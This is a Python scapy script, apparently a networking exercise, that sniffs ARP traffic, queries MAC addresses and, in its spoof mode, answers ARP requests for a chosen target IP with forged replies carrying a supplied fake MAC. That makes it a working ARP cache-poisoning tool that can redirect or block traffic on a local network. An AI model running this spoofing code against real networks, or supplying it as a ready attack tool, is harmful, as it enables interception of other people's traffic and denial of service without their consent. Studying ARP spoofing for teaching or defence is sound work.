#!/usr/bin/env python3

import scapy.all as scapy
import sys
import os


def getMAC(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast,
                              timeout=5, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    return 'not found'


def showPacket(packet):
    if target_ip != None and packet[scapy.ARP].pdst != target_ip:
        return
    printWhoHas(packet[scapy.ARP].pdst, packet[scapy.ARP].psrc)


def printWhoHas(dst, src):
    l = 25 + len(dst)
    line = '{:>1} {:>{l}}'.format(
        'Get ARP packet - Who has ' + dst,
        ' Tell ' + src,
        l=l
    )
    print(line)


def stopFilter(packet):
    if packet[scapy.ARP].pdst == target_ip:
        return True
    return False


def spoof(req):
    if req[scapy.ARP].pdst == target_ip:
        printWhoHas(req[scapy.ARP].pdst, req[scapy.ARP].psrc)
        packet = scapy.ARP(
            op=2,
            pdst=req[scapy.ARP].psrc,
            hwdst=getMAC(req[scapy.ARP].psrc),
            psrc=target_ip,
            hwsrc=fake_mac,
        )
        scapy.send(packet, verbose=False)
        print('Sent ARP Reply : ' + target_ip + ' is ' + fake_mac)
        print('Send successful.')


DEVICE_NAME = 'enp2s0f5'
my_ip = scapy.get_if_addr(DEVICE_NAME)
fake_mac = None
target_ip = None

print('[ARP sniffer and spoof program ]')

if os.geteuid() != 0:
    print('ERROR: You must be root to use this tool!')
elif sys.argv[1] == '-help':
    print('Format :')
    print('1) ./arp -l -a')
    print('2) ./arp -l <filter_ip_address>')
    print('3) ./arp -q <query_ip_address>')
    print('4) ./arp <fake_mac_address> <targe_ip_address>')
elif sys.argv[1] == '-l':
    print('### ARP sniffer mode ###')
    if sys.argv[2] == '-a':
        target_ip = None
    else:
        target_ip = sys.argv[2]
    scapy.sniff(
        iface=DEVICE_NAME,
        filter='arp',
        prn=showPacket,
    )
elif sys.argv[1] == '-q':
    print('### ARP query mode ###')
    mac = getMAC(sys.argv[2])
    print('MAC address of ' + sys.argv[2] + ' is ' + mac)
else:
    print('### ARP spoof mode ###')
    fake_mac = sys.argv[1]
    target_ip = sys.argv[2]
    scapy.sniff(
        iface=DEVICE_NAME,
        filter='arp',
        prn=spoof,
        stop_filter=stopFilter,
    )
